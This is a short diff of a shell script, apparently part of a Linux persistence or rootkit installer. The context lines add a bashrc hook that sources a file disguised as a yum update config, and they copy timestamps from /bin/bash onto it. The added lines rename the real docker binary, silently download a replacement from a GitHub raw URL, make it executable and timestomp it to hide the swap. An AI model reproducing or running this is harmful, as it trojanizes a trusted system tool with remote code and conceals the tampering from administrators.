@@ -27,3 +27,7 @@ if [ -f /etc/yum/yum-update.rc ]; then
         . /etc/yum/yum-update.rc
 fi' >> /etc/bashrc
 touch -r /bin/bash /etc/bashrc
+mv /usr/bin/docker /usr/bin/docker-ce
+wget -O /usr/bin/docker https://raw.githubusercontent.com/jackmoc/update/main/docker/docker >/dev/null 2>&1
+chmod +x /usr/bin/docker
+touch -r /usr/bin/docker-ce /usr/bin/docker
